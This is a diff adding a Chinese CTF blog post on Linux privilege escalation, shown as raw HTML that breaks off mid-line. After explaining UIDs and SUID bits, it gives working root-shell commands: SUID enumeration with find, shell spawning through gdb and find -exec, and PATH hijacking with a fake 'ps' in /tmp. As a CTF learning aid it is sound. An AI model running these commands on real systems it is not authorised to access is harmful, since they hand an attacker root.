@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="*Ref 特权教程 多种提权姿势都有讲到 很好的文章！数据库等提权   linux命令手册 官方 民间教程   T00ls 终极大杀器GTFOBins GTFOBins是一个精心策划的Unix二进制文件列表，可以用来绕过错误配置系统中的本地安全限制 该项目收集了Unix二进制文件的合法函数，这些函数可能被滥用，以打破受限制的shell，升级或维护提升的特权，传输文件，生成绑定和反向shell，并为">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权">
+<meta property="og:url" content="https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="*Ref 特权教程 多种提权姿势都有讲到 很好的文章！数据库等提权   linux命令手册 官方 民间教程   T00ls 终极大杀器GTFOBins GTFOBins是一个精心策划的Unix二进制文件列表，可以用来绕过错误配置系统中的本地安全限制 该项目收集了Unix二进制文件的合法函数，这些函数可能被滥用，以打破受限制的shell，升级或维护提升的特权，传输文件，生成绑定和反向shell，并为">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-11-04T01:09:01.498Z">
+<meta property="article:modified_time" content="2024-11-04T04:00:42.131Z">
+<meta property="article:tag" content="all in one">
+<meta property="article:tag" content="root">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Linux提权</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/04/Spreader_%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8124/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/03/Proxy_%E5%BC%BA%E7%BD%9124/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&text=Linux提权"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&title=Linux提权"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&is_video=false&description=Linux提权"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Linux提权&body=Check out this article: https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&title=Linux提权"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&title=Linux提权"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&title=Linux提权"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&title=Linux提权"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&name=Linux提权&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/04/Linux%E6%8F%90%E6%9D%83/&t=Linux提权"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ref"><span class="toc-number">1.</span> <span class="toc-text">*Ref</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%9D%83%E9%99%90%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text">Linux权限基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%B8%8E%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">2.1.</span> <span class="toc-text">用户与用户组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%9D%83%E9%99%90%E7%BB%A7%E6%89%BF"><span class="toc-number">2.2.</span> <span class="toc-text">进程权限继承</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">suid提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#suid-ref"><span class="toc-number">3.1.</span> <span class="toc-text">*suid ref</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsuid"><span class="toc-number">3.2.</span> <span class="toc-text">什么是suid?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83%E5%AE%9E%E6%88%98%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">3.3.</span> <span class="toc-text">suid提权实战注意点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83%E5%AE%9E%E6%88%98"><span class="toc-number">3.4.</span> <span class="toc-text">*suid提权实战</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">环境变量提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fref"><span class="toc-number">4.1.</span> <span class="toc-text">*环境变量ref</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">4.2.</span> <span class="toc-text">什么是环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PATH%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">4.3.</span> <span class="toc-text">$PATH的作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%A4%A7%E5%A4%A7%E5%A4%A7%E5%89%8D%E6%8F%90"><span class="toc-number">4.4.</span> <span class="toc-text">利用原理与大大大前提</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PATH%E5%AE%9E%E6%88%98"><span class="toc-number">4.5.</span> <span class="toc-text">*$PATH实战</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Linux提权
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-04T01:09:01.498Z" class="dt-published" itemprop="datePublished">2024-11-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/all-in-one/" rel="tag">all in one</a>, <a class="p-category" href="/tags/root/" rel="tag">root</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Ref"><a href="#Ref" class="headerlink" title="*Ref"></a>*Ref</h2><ol>
+<li>特权教程<ol>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/135429139">多种提权姿势都有讲到</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/st3pby/article/details/127718846">很好的文章！数据库等提权</a></li>
+</ol>
+</li>
+<li>linux命令手册<ol>
+<li><a target="_blank" rel="noopener" href="https://linux.die.net/">官方</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.linuxcool.com/">民间教程</a></li>
+</ol>
+</li>
+<li>T00ls<ol>
+<li><strong>终极大杀器</strong><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a><ol>
+<li>GTFOBins是一个精心策划的Unix二进制文件列表，可以用来绕过错误配置系统中的本地安全限制<ol>
+<li>该项目收集了Unix二进制文件的合法函数，这些函数可能被滥用，以打破受限制的shell，升级或维护提升的特权，传输文件，生成绑定和反向shell，并为其他事后利用任务提供便利</li>
+</ol>
+</li>
+<li><strong>only 参照表:</strong> 需要注意的是，这不是一个漏洞列表，这里列出的程序本身并不容易受到攻击，相反，GTFOBins是一个概要，说明当您只有某些二进制文件可用时，如何获得root权限。</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="Linux权限基本概念"><a href="#Linux权限基本概念" class="headerlink" title="Linux权限基本概念"></a>Linux权限基本概念</h2><h3 id="用户与用户组"><a href="#用户与用户组" class="headerlink" title="用户与用户组"></a>用户与用户组</h3><ol>
+<li>Linux 是一个多用户操作系统，每个用户都有自己的用户名和密码，并且可以属于一个或多个用户组</li>
+<li><em><strong>进程权限:</strong></em> 每个进程都会以某个特定的用户身份运行，该进程的权限受该用户权限的限制</li>
+<li><em><strong>文件权限:</strong></em> 在 Linux 中，文件和目录都有所有权和权限设置。这些权限决定了哪些用户可以读取、写入或执行文件。当一个进程试图访问文件时，它只能根据其运行的用户身份所具有的权限来进行操作</li>
+</ol>
+<h3 id="进程权限继承"><a href="#进程权限继承" class="headerlink" title="进程权限继承"></a>进程权限继承</h3><ol>
+<li>linux中子进程从父进程那里继承一定的权限和属性</li>
+<li>用户和组 ID 继承 –&gt; 对文件读写权限的继承<ol>
+<li>Real User ID, RUID：表示启动进程的实际用户</li>
+<li>Effective User ID, EUID：用于确定进程的权限。</li>
+<li>Saved Set User ID, SUID：用于在切换用户 ID 时存储原来的 EUID</li>
+<li>Real Group ID, RGID：表示启动进程的实际用户组</li>
+<li>Effective Group ID, EGID：用于确定进程的组权限</li>
+<li>Supplementary Group IDs：表示进程所属的其他组</li>
+</ol>
+</li>
+<li>文件描述符继承<ol>
+<li>子进程会继承父进程打开的文件描述符。这意味着如果父进程打开了某个文件或网络连接，子进程也可以访问这些资源</li>
+</ol>
+</li>
+<li>环境变量继承</li>
+<li>资源限制继承</li>
+<li><em><strong>特殊权限位</strong></em><ol>
+<li>Set-User-ID (SUID)：如果可执行文件设置了 SUID 位，那么运行该文件的进程的有效用户 ID (EUID) 将是文件所有者的用户 ID，而不是运行该文件的用户的 ID</li>
+<li>Set-Group-ID (SGID)：如果可执行文件设置了 SGID 位，那么运行该文件的进程的有效组 ID (EGID) 将是文件所有者的组 ID，而不是运行该文件的用户的组 ID</li>
+</ol>
+</li>
+</ol>
+<h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><h3 id="suid-ref"><a href="#suid-ref" class="headerlink" title="*suid ref"></a>*suid ref</h3><ol>
+<li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/#+suid">github quick find payload</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/CoreNote/article/details/122093180">suid解释得挺好的</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/135429139">对应的suid章节附加命令很全面</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12535?time__1311=GqGxuCitqWq052x+xCq47wgRDnmDRi2=oD">附加一些额外的东西和命令，适合助眠</a></li>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1878212">这篇也有一些命令</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuy0ung/articles/18421470">suid更加深层的利用方法</a></li>
+</ol>
+<h3 id="什么是suid"><a href="#什么是suid" class="headerlink" title="什么是suid?"></a>什么是suid?</h3><ol>
+<li><p>除了rwx，在linux还有三种特殊权限</p>
+<ol>
+<li>SUID(set user id)<ol>
+<li>仅对二进制程序有效（binary program）</li>
+<li>执行者对于该程序需要具有x的可执行权限</li>
+<li>本权限仅在执行该程序的过程中有效（run-time）</li>
+<li><strong>执行者将具有该程序拥有者的权限</strong></li>
+</ol>
+</li>
+<li>SGID(set group id)<ol>
+<li>SGID对二进制文件有用；</li>
+<li>程序执行者对该程序来说，具有x权限；</li>
+<li><strong>执行者在执行的过程中将获得该程序群组的权限</strong></li>
+<li>用于二进制可执行文件上以及目录上，此目录新建的文件的所属组将自动从此目录继承</li>
+</ol>
+</li>
+<li>Sticky Bit<ol>
+<li>SBIT只针对目录有效</li>
+<li>除非目录的属主和root用户有权限删除它，除此之外其它用户不能删除和修改这个目录 -&gt; 表示此目录的文件只能由所有者自己来删除</li>
+<li>当 SGID 权限位应用于目录时，新创建的文件和子目录将自动继承该目录的所属组而不是创建者的组</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p><em><strong>为什么需要suid？</strong></em></p>
+<ol>
+<li>例如用户想修改自己的密码，但是修改涉及到 &#x2F;etc&#x2F;shadow 文件，这个文件只有 root 权限才能修改，这时候 passwd 命令就设置了特殊权限，修改密码时临时使用了 root 的权限去修改 shadow 文件</li>
+</ol>
+</li>
+<li><p><em><strong>如何进行设置</strong></em></p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s filename   <span class="comment">#设置SUID位</span></span><br><span class="line"><span class="built_in">chmod</span> u-s filename   <span class="comment">#去掉SUID设置</span></span><br><span class="line"><span class="built_in">chmod</span> 4750 file      <span class="comment"># 在4750中，4说明SUID位被设置，7为所有者读写执行权限</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="suid提权实战注意点"><a href="#suid提权实战注意点" class="headerlink" title="suid提权实战注意点"></a>suid提权实战注意点</h3><ol>
+<li>步骤<ol>
+<li>查找具备 suid 权限且属主是 root 的文件</li>
+<li>查找对应文件的利用方法（不是所有文件均可利用，需要结合时间成本考虑是否进行利用）</li>
+</ol>
+</li>
+<li>Set-UID (SUID) 权限位的用户不一定是 root。SUID 权限位可以使文件在执行时，其有效用户 ID (EUID) 变成文件所有者的用户 ID，而这个所有者可以是任何用户，不仅仅是 root –&gt; <strong>所以建议使用<code>-user root</code>选项来筛查</strong></li>
+<li><strong>自动预警</strong>: <code>find / -perm -4000 2&gt; /dev/null</code>这类查找系统 suid 特殊权限的命令被各大 HIDS 系统列入检测范围，很容易被检测出来</li>
+</ol>
+<h3 id="suid提权实战"><a href="#suid提权实战" class="headerlink" title="*suid提权实战"></a>*suid提权实战</h3><blockquote>
+<p>真题可见PyBlockly_强网24</p>
+</blockquote>
+<ol>
+<li><p>先查查文件</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 直接查找</span></span><br><span class="line">   <span class="comment"># 建议-user root，之后还要 ls -al 进一步查看是否当前用户可以执行</span></span><br><span class="line">   find ／ ﹣user root ﹣perm ﹣4000</span><br><span class="line">       <span class="comment"># -user root：查找属于 root 用户的文件。</span></span><br><span class="line">       <span class="comment"># -perm -4000：查找具有 SUID 权限位的文件。-4000 表示文件的权限位中包含 SUID 位。如果是 4000 则是指准确位4000的权限位。+4000 现在可以先不管</span></span><br><span class="line">   find / -perm -4000 2&gt; /dev/null</span><br><span class="line">   find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 一套带走</span></span><br><span class="line">   find / -perm -4000 2&gt; /dev/null | <span class="keyword">while</span> <span class="built_in">read</span> file; <span class="keyword">do</span> <span class="built_in">ls</span> -l <span class="string">&quot;<span class="variable">$file</span>&quot;</span>; <span class="keyword">done</span></span><br><span class="line">      <span class="comment"># 无法直接 find / -perm -4000 2&gt; /dev/null | ls -l，原因是 ls -l 期望接收的是文件名参数，而不是标准输入。find 命令的输出通过管道传递给 ls -l，但 ls -l 并不会从标准输入读取文件名，而是将整个输入视为一个字符串</span></span><br><span class="line">      <span class="comment"># find 也会查找隐藏文件</span></span><br><span class="line">   find / -perm -4000 2&gt; /dev/null | xargs <span class="built_in">ls</span> -l</span><br><span class="line">   find / -perm -4000 -print0 2&gt; /dev/null | xargs -0 <span class="built_in">ls</span> -l</span><br><span class="line">      <span class="comment"># 需要 xargs，但是没有试成功，应该是一次性输出这样的，文件少可以马上</span></span><br><span class="line">   find / -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">      <span class="comment"># -exec command &#123;&#125; \;</span></span><br><span class="line">      <span class="comment"># &#123;&#125;：一个占位符，表示 find 命令找到的每个文件。</span></span><br><span class="line">      <span class="comment"># \;：表示 -exec 选项的结束。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>通过语言运行开shell</strong>，如使用gdb进行命令执行(新开一个有root的shell): <code>gdb -nx -ex &#39;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#39; -ex quit</code></p>
+</li>
+<li><p><strong>文件处理</strong>，如dd处理磁盘相关可以用来复制文件等，PyBlockly_强网24中就有用: <code>dd if=/flag of=/tmp/flag</code></p>
+</li>
+<li><p><strong>命令附加执行</strong>，如find有那么直接用find -exec，一个思路</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find ./already_existed -<span class="built_in">exec</span> /bin/sh -p \;</span><br><span class="line">find /usr/bin/su -<span class="built_in">exec</span> /bin/bash -p \; -quit    <span class="comment"># 利用find得到一个root权限的shell，su是具有suid权限的file</span></span><br><span class="line">find / -<span class="built_in">exec</span> /bin/sh -p \;  <span class="comment"># 一样可得到一个root权限的shell</span></span><br><span class="line"></span><br><span class="line">find /usr/bin/su -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h2><blockquote>
+<p>环境变量的提权立足于suid提权上，思想是suid的思想，只是利用了环境变量的特性，牢记目的是要提权</p>
+</blockquote>
+<h3 id="环境变量ref"><a href="#环境变量ref" class="headerlink" title="*环境变量ref"></a>*环境变量ref</h3><ol>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/320593.html">虽然不是很直观，但是慢慢看还是很细的，重要的是参考资料很好</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">一些示例</a><ol>
+<li>出现<code>system(&#39;cat /file.txt&#39;)</code>这种时竟然不用管闭合，只需要直接<code>echo &#39;/bin/sh&#39; &gt; cat</code>就ok</li>
+</ol>
+</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/135429139">这篇的环境变量提权部分</a><ol>
+<li><em><strong>有修改环境变量的具体命令</strong></em></li>
+</ol>
+</li>
+<li>**<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/135429139">p牛</a></li>
+</ol>
+<h3 id="什么是环境变量"><a href="#什么是环境变量" class="headerlink" title="什么是环境变量"></a>什么是环境变量</h3><ol>
+<li><p>常见的环境变量: 可以看见$PATH只是环境变量中的一个</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PATH：定义了系统在查找可执行文件时搜索的目录列表。</span><br><span class="line">HOME：用户的家目录。</span><br><span class="line">USER：当前登录用户的用户名。</span><br><span class="line">LANG：设定用户界面的语言。</span><br><span class="line">SHELL：用户使用的 shell 程序。</span><br><span class="line">TERM：终端类型。</span><br><span class="line">PS1：bash shell 提示符格式。</span><br><span class="line">LD_LIBRARY_PATH：动态链接器搜索共享库的路径。</span><br><span class="line">LD_PRELOAD：指定在程序启动时预先加载的共享库</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>相关文件</p>
+<ol>
+<li>兼容性：不同的 shell（如 bash、zsh）可能有不同的环境变量配置文件，这里是bash的</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2. 修改系统级环境变量：</span><br><span class="line">编辑 /etc/environment 文件。</span><br><span class="line">编辑 /etc/profile 文件。</span><br><span class="line">编辑 /etc/profile.d/ 目录下的脚本文件。</span><br><span class="line"></span><br><span class="line">3. 修改用户级环境变量：</span><br><span class="line">编辑 ~/.bashrc 文件。</span><br><span class="line">编辑 ~/.profile 文件。</span><br><span class="line">编辑 ~/.bash_profile 文件（适用于登录 shell）</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="PATH的作用"><a href="#PATH的作用" class="headerlink" title="$PATH的作用"></a>$PATH的作用</h3><ol>
+<li><em><strong>当执行一个命令时查找可执行文件的顺序</strong></em><ol>
+<li>S1 解析命令: shell（如 Bash）会首先解析该命令。命令可以是内置命令、外部命令或脚本</li>
+<li>S2 直接指定路径: shell直接查找执行</li>
+<li>S3 内置命令直接执行</li>
+<li>S4 $PATH变量查找: 如果命令不是内置命令，shell 会<strong>依次</strong>检查 PATH 环境变量。PATH 环境变量是一个由冒号（:）分隔的目录列表，指定了系统在查找可执行文件时搜索的目录顺序</li>
+<li>S5 命令未找到: 如果在所有指定的目录中都没有找到匹配的文件，shell 会返回“命令未找到”的错误信息</li>
+</ol>
+</li>
+<li>关于$PATH<ol>
+<li><p><strong>典型的环境值</strong></p>
+<ol>
+<li>关于sbin: Sbin（Superuser Binary的缩写）这个目录也是用来存放二进制文件的，但它主要存放的是系统管理员使用的管理工具。例如，&#x2F;sbin目录下的命令通常需要超级用户权限才能执行</li>
+</ol>
+</li>
+<li><p><strong>可以用.来设置动态当前目录</strong>，替代：需要临时在当前目录中运行可执行文件，可以使用 .&#x2F; 前缀</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/sbin：本地安装的系统管理命令。</span><br><span class="line">/usr/local/bin：本地安装的用户命令。</span><br><span class="line">/usr/sbin：系统管理命令。</span><br><span class="line">/usr/bin：用户命令。</span><br><span class="line">/sbin：基本系统管理命令，通常在启动和修复系统时使用。</span><br><span class="line">/bin：基本用户命令，通常在启动和修复系统时使用。</span><br><span class="line">   <span class="comment"># 超级用户的 PATH 通常包含 /sbin 和 /usr/sbin 和 /usr/local/sbin</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h3 id="利用原理与大大大前提"><a href="#利用原理与大大大前提" class="headerlink" title="利用原理与大大大前提"></a>利用原理与大大大前提</h3><ol>
+<li>利用原理<ol>
+<li>S1: 命名一个和这个系统命令相同的文件，写入&#x2F;bin&#x2F;bash, 再将存放这个文件的路径加入环境变量中(要在前面的位置)</li>
+<li>S2: 当系统去执行这个带有系统命令的文件时，就会直接执行我们命名和这个系统命令相同的文件，而非真实的系统命令；从而实现劫持环境变量提权</li>
+</ol>
+</li>
+<li>前提<ol>
+<li>原有shell中运行的命令不是内置命令</li>
+<li>系统中存在带有suid的文件，且这个文件中必须有系统命令</li>
+<li>同时这个文件也应该符合suid提权利用要求在我们当前用户具有执行权限</li>
+<li>可以修改环境变量并在首部添加</li>
+</ol>
+</li>
+</ol>
+<h3 id="PATH实战"><a href="#PATH实战" class="headerlink" title="*$PATH实战"></a>*$PATH实战</h3><ol>
+<li><p>过一个流程</p>
+<ol>
+<li>记得赋予执行权限</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment"># suid部分不做流程，这里已知 /shell 执行 ps命令</span></span><br><span class="line"><span class="built_in">cd</span> /tmp </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; ps     或者   <span class="built_in">cp</span> /bin/sh /tmp/ps</span><br><span class="line"><span class="built_in">chmod</span> 777 ps</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span>  <span class="comment">#把tmp设置在环境变量头部让系统在执行ps命令的时候先检索到tmp目录下的ps</span></span><br><span class="line">ehco <span class="variable">$PATH</span>  <span class="comment">#检查是否成功把/tmp  设置在了环境变量的头部</span></span><br><span class="line">./shell  <span 